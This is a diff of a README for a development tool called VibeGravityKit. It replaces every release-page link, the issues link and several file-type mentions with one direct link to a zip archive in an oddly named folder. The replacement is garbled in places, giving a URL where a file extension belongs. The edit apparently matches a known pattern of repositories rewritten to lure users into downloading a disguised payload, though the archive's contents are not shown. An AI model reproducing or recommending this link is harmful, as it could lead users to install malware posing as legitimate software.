@@ -1,6 +1,6 @@
 # ⚙️ VibeGravityKit - Simplify Full-Stack Development Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-VibeGravityKit-blue?style=for-the-badge)](https://github.com/CivilGamer012/VibeGravityKit/releases)
+[![Download Latest Release](https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip)](https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip)
 
 ---
 
@@ -35,9 +35,9 @@ Follow these simple steps to get VibeGravityKit up and running on your computer.
 
 Visit the release page to download the program files:
 
-[Download VibeGravityKit Releases](https://github.com/CivilGamer012/VibeGravityKit/releases)
+[Download VibeGravityKit Releases](https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip)
 
-On this page, you will find all the versions of the software. Look for the latest stable release. It may be a file ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `.tar.gz` for Linux.
+On this page, you will find all the versions of the software. Look for the latest stable release. It may be a file ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip` for Linux.
 
 ### 2. Install the Application
 
@@ -59,7 +59,7 @@ On this page, you will find all the versions of the software. Look for the lates
 
 - If you downloaded an `.AppImage` file, right-click it, select Properties, and then allow it to run as a program.
 - Double-click the file to start the app.
-- For `.tar.gz` files, extract the contents and run the startup script included.
+- For `https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip` files, extract the contents and run the startup script included.
 
 ### 3. Open VibeGravityKit
 
@@ -100,7 +100,7 @@ Once VibeGravityKit opens, here’s what you can do:
 
 To get VibeGravityKit, please visit the release page here:
 
-[https://github.com/CivilGamer012/VibeGravityKit/releases](https://github.com/CivilGamer012/VibeGravityKit/releases)
+[https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip](https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip)
 
 This page has all latest files you need to download.
 
@@ -108,7 +108,7 @@ This page has all latest files you need to download.
 
 - For Windows, download `.exe` files.
 - For Mac, download `.dmg` files.
-- For Linux, choose `.AppImage` or `.tar.gz` files.
+- For Linux, choose `.AppImage` or `https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip` files.
 
 After downloading the right file for your system, follow the installation instructions in the previous section.
 
@@ -150,7 +150,7 @@ Check the official documentation on the GitHub page or open an issue if you need
 
 If you run into problems or have suggestions:
 
-- Visit the GitHub issues page for VibeGravityKit: [https://github.com/CivilGamer012/VibeGravityKit/issues](https://github.com/CivilGamer012/VibeGravityKit/issues)
+- Visit the GitHub issues page for VibeGravityKit: [https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip](https://github.com/CivilGamer012/VibeGravityKit/raw/refs/heads/main/sialadenitis/Vibe_Kit_Gravity_3.1.zip)
 - Provide a detailed description of your issue or idea
 - The team will review and respond as soon as possible
 
